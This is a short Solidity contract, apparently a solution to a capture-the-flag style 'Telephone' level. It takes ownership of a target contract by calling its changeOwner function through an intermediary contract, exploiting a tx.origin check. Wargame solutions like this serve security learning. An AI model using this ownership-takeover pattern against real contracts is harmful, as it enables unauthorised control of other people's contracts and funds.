// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./Telephone.sol";

contract TelephoneAttacker {
  using SafeMath for uint256;
  Telephone target;

  constructor(address _target) public {
    target = Telephone(_target);
  }
  function attack() public {
    target.changeOwner(msg.sender);
  }
}

